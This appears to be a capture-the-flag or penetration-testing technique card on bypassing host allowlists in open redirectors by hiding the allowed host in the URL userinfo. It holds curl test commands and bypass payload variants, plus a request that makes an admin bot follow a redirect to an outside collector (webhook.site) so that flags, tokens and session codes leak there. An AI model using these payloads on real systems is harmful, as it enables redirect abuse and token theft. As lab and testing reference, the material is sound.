# Allowlist Host Userinfo Open Redirect

## Context

Use when a redirector validates destinations against a visible allowed host such as `pwnbox.io`, `example.com`, or a partner domain.

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review.
- Do not store live secrets, tokens, cookies, flags, or private URLs in reusable files.

## Baseline Block Test

```bash
curl -sS -G "https://[host]/go" --data-urlencode "to=https://example.com"
```

Useful error text:

```text
That destination is not on the route map.
```

## Core Bypass Payload

```text
https://allowed.host@collaborator
```

Example:

```text
https://pwnbox.io@webhook.site/YOUR-UUID
```

Check redirect:

```bash
curl -sS -D - -o /dev/null -G "https://[host]/go" \
  --data-urlencode "to=https://pwnbox.io@webhook.site/testuuid123"
```

Expected:

```text
HTTP/1.1 302 Found
Location: https://pwnbox.io@webhook.site/testuuid123
```

## Admin Bot Wrapper URL

If the bot only visits same-origin links:

```text
https://[host]/go?to=https://pwnbox.io@webhook.site/YOUR-UUID
```

Report it:

```bash
curl -sS -X POST "https://[host]/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[host]/go?to=https%3A%2F%2Fpwnbox.io%40webhook.site%2FYOUR-UUID"}'
```

## Useful Variants

```text
https://allowed.host:443@collaborator
https://allowed.host@collaborator/
https://allowed.host@collaborator/path
https://allowed.host%40collaborator
https://allowed.host%2f@collaborator
https://allowed.host.collaborator
```

## What To Look For At Collaborator

```text
?flag=
?token=
?session=
?code=
Referer:
```

## Why This Works

Substring allowlists match `allowed.host` inside the full URL string. URL parsers treat the text before `@` as userinfo, so the actual destination host can be attacker-controlled.

## Common Mistakes

- Reporting the external bypass URL directly when the bot only accepts same-origin links.
- Stopping after a 302 without checking whether the browser host is really external.
- Assuming open redirect alone is the final impact and missing privileged query leakage from admin redirects.

## Escalation Order

1. Identify allowed host hint
2. Test `https://allowed.host@collaborator`
3. Wrap in same-origin `/go?to=...`
4. Report to admin bot
5. Inspect collaborator for leaked query parameters
